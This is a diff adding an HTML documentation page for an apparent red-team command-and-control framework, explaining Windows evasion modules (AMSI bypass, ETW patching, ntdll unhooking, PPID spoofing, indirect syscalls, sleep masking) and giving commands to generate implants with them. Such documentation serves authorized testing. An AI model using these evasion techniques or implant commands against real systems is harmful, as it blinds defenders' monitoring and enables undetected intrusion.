@@ -1,0 +1,300 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#110e10">
+<meta name="description" content="Sentrava C2 Windows OPSEC modules: ETW patching, AMSI bypass, PPID spoofing, NTDLL unhooking, indirect syscalls, SleepMask, Kill Date, Working Hours."><title>Windows OPSEC — Sentrava C2 Documentation</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+<link rel="stylesheet" href="../style.css">
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+<style>
+.docs-article h1{font-size:2rem;font-weight:700;margin-bottom:1rem;line-height:1.2;letter-spacing:-.03em}
+.docs-article h2{font-size:1.4rem;font-weight:600;margin-top:2rem;margin-bottom:.75rem;line-height:1.25;letter-spacing:-.02em}
+.docs-article h3{font-size:1.15rem;font-weight:600;margin-top:1.5rem;margin-bottom:.5rem;line-height:1.3;letter-spacing:-.01em}
+</style>
+</head><body class="docs-page">
+<a class="skip-link" href="#main">Skip to content</a>
+<svg class="svg-definitions" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><defs>
+<symbol id="serpent" viewBox="300 230 640 800"><path fill="currentColor" fill-rule="evenodd" d="M600 246H789L862 317 916 429 847 500 875 443 781 416 696 345H620L456 462 891 706V821L719 939H491L323 1014 483 887V854L366 757V648L598 847H708L802 775 365 529 364 416Z M783 318 840 351 865 398 808 375Z"/></symbol>
+<symbol id="network" viewBox="0 0 24 24"><rect x="8" y="2" width="8" height="5" rx="1"/><rect x="2" y="17" width="7" height="5" rx="1"/><rect x="15" y="17" width="7" height="5" rx="1"/><path d="M12 7v5M5.5 17v-5h13v5"/></symbol>
+<symbol id="mask" viewBox="0 0 24 24"><path d="M3 5l9 3 9-3v7c0 5-5 8-9 10-4-2-9-5-9-10V5Z"/><path d="m6 11 4 2m8-2-4 2m-5 4h6"/></symbol>
+<symbol id="shield" viewBox="0 0 24 24"><path d="m12 2 9 4v6c0 5-9 10-9 10S3 17 3 12V6l9-4Z"/><path d="m8 12 3 3 5-6"/></symbol>
+<symbol id="terminal" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="18" rx="2"/><path d="m6 9 4 3-4 3m7 1h5"/></symbol>
+<symbol id="arrows" viewBox="0 0 24 24"><path d="M3 7h17m-5-5 5 5-5 5M21 17H4m5-5-5 5 5 5"/></symbol>
+<symbol id="icon-dashboard" viewBox="0 0 24 24"><rect x="2" y="2" width="8" height="9" rx="1"/><rect x="14" y="2" width="8" height="5" rx="1"/><rect x="2" y="15" width="8" height="7" rx="1"/><rect x="14" y="11" width="8" height="11" rx="1"/></symbol>
+</defs></svg>
+<header class="site-header"><div class="nav-container">
+<a class="brand" href="../index.html" aria-label="Sentrava C2 home"><svg class="brand-mark" aria-hidden="true"><use href="#serpent"/></svg><span>SENTRAVA <span class="brand-suffix">C2</span></span></a>
+<button class="menu-toggle" type="button" data-toggle aria-controls="primary-nav" aria-expanded="false" aria-label="Toggle navigation"><span></span><span></span><span></span></button>
+<nav id="primary-nav" class="primary-nav" aria-label="Primary navigation">
+<a href="getting-started.html">Docs</a><a href="transport-mtls.html">Transports</a><a href="opsec-overview.html">OPSEC</a><a href="dashboard-overview.html">Dashboard</a><a href="https://github.com/raovv-s/sentrava_c2">GitHub <span aria-hidden="true">↗</span></a><a class="button button-small button-primary nav-cta" href="quick-start.html">Get started <span aria-hidden="true">→</span></a>
+</nav></div></header>
+<div class="docs-mobile-bar"><button type="button" class="sidebar-toggle" data-toggle aria-controls="docs-sidebar" aria-expanded="false"><span aria-hidden="true">☰</span> Documentation menu</button><span class="version-label">MVP / Linux + Windows</span></div><aside id="docs-sidebar" class="docs-sidebar" aria-label="Documentation navigation"><div class="sidebar-heading"><span class="eyebrow">Operator manual</span><span class="version-label">01</span></div>
+<div class="search-box"><label class="sr-only" for="topic-search">Filter documentation topics</label><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m16 16 5 5"/></svg><input id="topic-search" type="search" placeholder="Filter topics…" autocomplete="off" spellcheck="false"></div><p id="search-feedback" class="search-feedback" role="status" aria-live="polite"></p><nav class="sidebar-nav" aria-label="Topics"><details open><summary>Getting started</summary><a href="getting-started.html">Overview</a><a href="installation.html">Installation</a><a href="quick-start.html">Quick start</a></details>
+<details open><summary>Transports</summary><a href="transport-mtls.html">mTLS (default)</a><a href="transport-tcp.html">TCP</a><a href="transport-http.html">HTTP + profiles</a><a href="transport-dns.html">DNS</a></details>
+<details open><summary>OPSEC</summary><a href="opsec-overview.html">Overview</a><a href="opsec-modules.html">Modules</a><a href="opsec-presets.html">Presets</a><a href="opsec-windows.html" aria-current="page">Windows OPSEC</a></details>
+<details open><summary>Capabilities</summary><a href="capability-shell.html">Shell</a><a href="capability-portfwd.html">Port forwarding</a><a href="capability-exec.html">Exec</a><a href="capability-ps.html">Process list</a></details>
+<details open><summary>Dashboard</summary><a href="dashboard-overview.html">Overview</a><a href="dashboard-listeners.html">Listeners</a><a href="dashboard-agents.html">Agents</a><a href="dashboard-sessions.html">Sessions</a></details>
+<details open><summary>Reference</summary><a href="cli-reference.html">CLI commands</a><a href="generate-options.html">Generate options</a><a href="c2-profiles.html">C2 profiles</a></details>
+</nav><div class="sidebar-note"><span class="small-dot" aria-hidden="true"></span><p>Explicit authorization.<br>Documented boundaries.</p></div></aside>
+<main id="main" class="docs-main"><article class="docs-article"><nav class="breadcrumbs" aria-label="Breadcrumb"><a href="../index.html">Home</a><span aria-hidden="true">/</span><span>OPSEC</span><span aria-hidden="true">/</span><span>Windows OPSEC</span></nav>
+<h1 id="windows-opsec">Windows OPSEC</h1>
+<p>Windows agents can be compiled with an additional set of pre-flight and runtime hardening modules that target the Windows detection surface. These modules are independent of the Linux OPSEC suite and are enabled via separate ldflags at generate time.</p>
+<div class="callout callout-info"><strong>Windows-specific stack.</strong><p>All modules in this section are Windows-only. They compile to no-ops on Linux. On Windows they run before the first beacon and remain active for the agent's lifetime.</p></div>
+
+<h2 id="module-overview">Module overview</h2>
+<div class="table-scroll" role="region" tabindex="0"><table>
+<thead>
+<tr>
+<th>Module</th>
+<th>Category</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>etw-patch</code></td>
+<td>Pre-flight</td>
+<td>Patches ETW (Event Tracing for Windows) to suppress kernel telemetry events</td>
+</tr>
+<tr>
+<td><code>amsi-bypass</code></td>
+<td>Pre-flight</td>
+<td>Patches AMSI to return AMSI_RESULT_CLEAN for all scans</td>
+</tr>
+<tr>
+<td><code>ppid-spoof</code></td>
+<td>Pre-flight</td>
+<td>Spoofs the parent process ID of the agent process at spawn time</td>
+</tr>
+<tr>
+<td><code>ntdll-unhook</code></td>
+<td>Pre-flight</td>
+<td>Restores ntdll.dll from a clean on-disk copy to remove AV/EDR inline hooks</td>
+</tr>
+<tr>
+<td><code>indirect-syscall</code></td>
+<td>Runtime</td>
+<td>Replaces Nt* API calls with indirect syscall stubs to avoid userland hook detection</td>
+</tr>
+<tr>
+<td><code>sleepmask-win</code></td>
+<td>Runtime</td>
+<td>XOR-masks agent memory region and flips page protection during sleep (Windows equivalent)</td>
+</tr>
+<tr>
+<td><code>kill-date</code></td>
+<td>Lifecycle</td>
+<td>Agent self-terminates after a hardcoded expiry timestamp</td>
+</tr>
+<tr>
+<td><code>working-hours</code></td>
+<td>Lifecycle</td>
+<td>Agent beacons only within a configured time window; sleeps outside it</td>
+</tr>
+</tbody>
+</table></div>
+
+<h2 id="etw-patch">etw-patch</h2>
+<p><strong>Category:</strong> Pre-flight<br>
+<strong>Ldflag:</strong> <code>embeddedWinEtwPatch=true</code></p>
+<p>Writes a <code>ret</code> stub (or <code>xor eax,eax / ret</code> on x64) to the entry point of <code>EtwEventWrite</code> in the process's <code>ntdll.dll</code> mapping. This prevents the ETW provider from writing process-creation and module-load events to the NT kernel logger session, which feeds Windows Defender, Sysmon, and many EDR kernel callbacks.</p>
+<div class="callout callout-warning"><strong>Kernel callbacks are not affected.</strong><p>ETW patching suppresses userland telemetry only. Kernel-mode callbacks registered by EDR drivers (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks) are not bypassed by this module.</p></div>
+
+<h2 id="amsi-bypass">amsi-bypass</h2>
+<p><strong>Category:</strong> Pre-flight<br>
+<strong>Ldflag:</strong> <code>embeddedWinAmsiBypass=true</code></p>
+<p>Patches <code>AmsiScanBuffer</code> in <code>amsi.dll</code> to unconditionally return <code>AMSI_RESULT_CLEAN</code> (0x1). The patch is applied to the in-process memory mapping of amsi.dll; it does not touch the on-disk file.</p>
+<p>Effective against PowerShell AMSI, .NET AMSI, VBA AMSI, and any in-process AMSI consumer that loads <code>amsi.dll</code> into the same process.</p>
+
+<h2 id="ppid-spoof">ppid-spoof</h2>
+<p><strong>Category:</strong> Pre-flight<br>
+<strong>Ldflag:</strong> <code>embeddedWinPpidSpoof=true</code>, <code>embeddedWinPpidTarget=&lt;process-name&gt;</code></p>
+<p>Uses <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> to assign a spoofed parent PID when the agent process is created. The target parent is resolved by name at runtime (defaults to <code>explorer.exe</code>) and passed as an inheritable handle to <code>CreateProcess</code>.</p>
+<p>This causes process-tree tools (Process Hacker, Sysmon Event ID 1) to show the agent parented under the spoofed process rather than the actual launcher.</p>
+<div class="code-block"><div class="code-toolbar"><span>sh</span><button class="copy-button" type="button" data-copy aria-label="Copy sh">Copy</button></div><pre><code class="language-sh"># Spoof parent as svchost.exe (default: explorer.exe)
+sentrava &gt; generate --os windows --win-ppid-target svchost.exe --win-opsec ppid-spoof --listener &lt;ip&gt;:4433
+</code></pre></div>
+
+<h2 id="ntdll-unhook">ntdll-unhook</h2>
+<p><strong>Category:</strong> Pre-flight<br>
+<strong>Ldflag:</strong> <code>embeddedWinNtdllUnhook=true</code></p>
+<p>Opens a fresh file handle to <code>ntdll.dll</code> on disk, maps it into memory, and copies the clean <code>.text</code> section over the in-process mapping. This overwrites any inline hooks (5-byte JMP patches) injected by EDR userland components, restoring native syscall thunks.</p>
+<p>Execution order: runs before AMSI bypass and ETW patch to ensure all subsequent patching goes through clean thunks.</p>
+
+<h2 id="indirect-syscall">indirect-syscall</h2>
+<p><strong>Category:</strong> Runtime<br>
+<strong>Ldflag:</strong> <code>embeddedWinIndirectSyscall=true</code></p>
+<p>Replaces direct <code>Nt*</code> Win32 API calls with assembly stubs that invoke the syscall instruction at an address inside <code>ntdll.dll</code> (not inside the agent's own code section). This technique:</p>
+<ul>
+<li>Avoids userland hooks that intercept the standard call path through <code>ntdll</code></li>
+<li>Causes the kernel's stack trace to show a return address inside <code>ntdll</code> rather than the agent</li>
+<li>Defeats EDR "syscall origin" checks that flag syscalls with unbacked return addresses</li>
+</ul>
+<p>Syscall numbers (SSN) are resolved dynamically at runtime by parsing the <code>ntdll.dll</code> export table, avoiding hardcoded SSN tables that differ between Windows versions.</p>
+
+<h2 id="sleepmask-win">sleepmask-win</h2>
+<p><strong>Category:</strong> Runtime<br>
+<strong>Ldflag:</strong> <code>embeddedWinSleepMask=true</code></p>
+<p>Windows equivalent of the Linux <code>sleepmask</code> module. During the beacon sleep interval:</p>
+<ol>
+<li>XOR-masks the agent's heap and stack regions with a random key</li>
+<li>Changes page protection of agent memory to <code>PAGE_NOACCESS</code> via <code>VirtualProtect</code></li>
+<li>Calls <code>SleepEx</code> for the configured interval</li>
+<li>Restores <code>PAGE_EXECUTE_READ_WRITE</code> and re-randomizes the XOR key on wake</li>
+</ol>
+<p>Makes the agent invisible to memory scanners that look for readable/executable shellcode during sleep.</p>
+
+<h2 id="kill-date">kill-date</h2>
+<p><strong>Category:</strong> Lifecycle<br>
+<strong>Ldflag:</strong> <code>embeddedKillDate=&lt;unix-timestamp&gt;</code></p>
+<p>The agent checks the current system clock against the embedded kill timestamp on every check-in cycle. When the current time exceeds the kill date, the agent exits immediately and removes itself from disk (if <code>--self-delete</code> is also set).</p>
+<div class="code-block"><div class="code-toolbar"><span>sh</span><button class="copy-button" type="button" data-copy aria-label="Copy sh">Copy</button></div><pre><code class="language-sh"># Kill date 2026-12-31 (Unix timestamp)
+sentrava &gt; generate --kill-date 2026-12-31 --os windows --listener &lt;ip&gt;:4433
+
+# Kill date with self-delete on expiry
+sentrava &gt; generate --kill-date 2026-12-31 --self-delete --os windows --listener &lt;ip&gt;:4433
+</code></pre></div>
+<div class="callout callout-warning"><strong>Clock skew.</strong><p>The kill date check uses the target's local clock. Large clock skew between operator and target can cause premature or delayed expiry. Prefer UTC timestamps and document the target's time zone.</p></div>
+
+<h2 id="working-hours">working-hours</h2>
+<p><strong>Category:</strong> Lifecycle<br>
+<strong>Ldflag:</strong> <code>embeddedWorkingHoursStart=&lt;HH:MM&gt;</code>, <code>embeddedWorkingHoursEnd=&lt;HH:MM&gt;</code></p>
+<p>Restricts beacon activity to a configured time window (local time on the target). Outside the window the agent sleeps without connecting to the C2 server. This mimics legitimate business-hours traffic patterns and avoids beaconing when analyst teams are typically active after hours.</p>
+<div class="code-block"><div class="code-toolbar"><span>sh</span><button class="copy-button" type="button" data-copy aria-label="Copy sh">Copy</button></div><pre><code class="language-sh"># Active 09:00–18:00 local time on target
+sentrava &gt; generate --working-hours 09:00-18:00 --os windows --listener &lt;ip&gt;:4433
+
+# Combined with kill date and full OPSEC
+sentrava &gt; generate --os windows --opsec full --win-opsec full --working-hours 09:00-18:00 --kill-date 2026-12-31 --listener &lt;ip&gt;:4433
+</code></pre></div>
+
+<h2 id="win-opsec-presets">Windows OPSEC presets</h2>
+<div class="table-scroll" role="region" tabindex="0"><table>
+<thead>
+<tr>
+<th>Preset</th>
+<th>Modules enabled</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--win-opsec none</code></td>
+<td>None (default)</td>
+</tr>
+<tr>
+<td><code>--win-opsec basic</code></td>
+<td>amsi-bypass, etw-patch</td>
+</tr>
+<tr>
+<td><code>--win-opsec full</code></td>
+<td>ntdll-unhook, amsi-bypass, etw-patch, ppid-spoof, indirect-syscall, sleepmask-win</td>
+</tr>
+</tbody>
+</table></div>
+<div class="code-block"><div class="code-toolbar"><span>sh</span><button class="copy-button" type="button" data-copy aria-label="Copy sh">Copy</button></div><pre><code class="language-sh"># Full Windows OPSEC stack + lifecycle controls
+sentrava &gt; generate --os windows --opsec full --win-opsec full \
+  --working-hours 09:00-18:00 --kill-date 2026-12-31 \
+  --transport mtls --listener 192.168.1.10:4433
+</code></pre></div>
+
+<h2 id="module-registry-ids">Module registry IDs</h2>
+<div class="table-scroll" role="region" tabindex="0"><table>
+<thead>
+<tr>
+<th>Module</th>
+<th>Registry ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>etw-patch</td>
+<td><code>win.opsec.etw</code></td>
+</tr>
+<tr>
+<td>amsi-bypass</td>
+<td><code>win.opsec.amsi</code></td>
+</tr>
+<tr>
+<td>ppid-spoof</td>
+<td><code>win.opsec.ppid</code></td>
+</tr>
+<tr>
+<td>ntdll-unhook</td>
+<td><code>win.opsec.ntdll</code></td>
+</tr>
+<tr>
+<td>indirect-syscall</td>
+<td><code>win.opsec.syscall</code></td>
+</tr>
+<tr>
+<td>sleepmask-win</td>
+<td><code>win.opsec.sleepmask</code></td>
+</tr>
+</tbody>
+</table></div><footer class="docs-footer"><span>© 2026 Sentrava C2</span><a href="https://github.com/raovv-s/sentrava_c2">Source and revision history ↗</a></footer></article></main><p id="copy-feedback" class="sr-only" role="status" aria-live="polite"></p>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  window.hljs?.highlightAll();
+  const toggles = [...document.querySelectorAll('[data-toggle]')];
+  const closeMenus = () => toggles.forEach(button => {
+    button.setAttribute('aria-expanded', 'false');
+    document.getElementById(button.getAttribute('aria-controls')).classList.remove('is-open');
+  });
+  toggles.forEach(button => button.addEventListener('click', () => {
+    const expanded = button.getAttribute('aria-expanded') !== 'true';
+    button.setAttribute('aria-expanded', String(expanded));
+    document.getElementById(button.getAttribute('aria-controls')).classList.toggle('is-open', expanded);
+  }));
+  document.querySelectorAll('.primary-nav a, .sidebar-nav a').forEach(link => link.addEventListener('click', closeMenus));
+  document.addEventListener('keydown', event => {
+    if (event.key === 'Escape') {
+      const activeToggle = toggles.find(button => button.getAttribute('aria-expanded') === 'true');
+      closeMenus(); activeToggle?.focus();
+    }
+  });
+  const updateHeader = () => document.querySelector('.site-header').classList.toggle('is-scrolled', scrollY > 12);
+  addEventListener('scroll', updateHeader, {passive:true}); updateHeader();
+  document.querySelectorAll('[data-copy]').forEach(button => button.addEventListener('click', async () => {
+    const text = button.closest('.code-block').querySelector('code').textContent;
+    try {
+      if (window.isSecureContext && navigator.clipboard) await navigator.clipboard.writeText(text);
+      else {
+        const field = document.createElement('textarea');
+        field.className = 'clipboard-buffer'; field.value = text; document.body.append(field); field.select();
+        let copied;
+        try { copied = document.execCommand('copy'); } finally { field.remove(); button.focus(); }
+        if (!copied) throw new Error('Copy unavailable');
+      }
+      document.getElementById('copy-feedback').textContent = 'Code copied to clipboard.';
+      button.textContent = 'Copied'; setTimeout(() => { button.textContent = 'Copy'; }, 1800);
+    } catch {
+      document.getElementById('copy-feedback').textContent = 'Copy unavailable. Select the code and copy it manually.';
+    }
+  }));
+  if ('IntersectionObserver' in window && !matchMedia('(prefers-reduced-motion: reduce)').matches) {
+    const observer = new IntersectionObserver(entries => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) { entry.target.classList.remove('reveal-pending'); observer.unobserve(entry.target); }
+      });
+    }, {threshold:.08});
+    document.querySelectorAll('.reveal').forEach(card => { card.classList.add('reveal-pending'); observer.observe(card); });
+  }
+  const search = document.getElementById('topic-search');
+  if (search) {
+    const groups = [...document.querySelectorAll('.sidebar-nav details')];
+    search.addEventListener('input', () => {
+      const query = search.value.trim().toLowerCase(); let count = 0;
+      groups.forEach(group => {
+        let visible = 0;
+        group.querySelectorAll('a').forEach(link => {
+          const matches = (link.textContent + ' ' + group.querySelector('summary').textContent).toLowerCase().includes(query);
+          link.hidden = !matches; if (matches) { visible++; count++; }
+        });
+        group.hidden = visible === 0; if (query && visible) group.open = true;
+      });
+      document.getElementById('search-feedback').textContent = query ? count + ' matching topics' : '';
+    });
+  }
+});
+</script>
+</body></html>
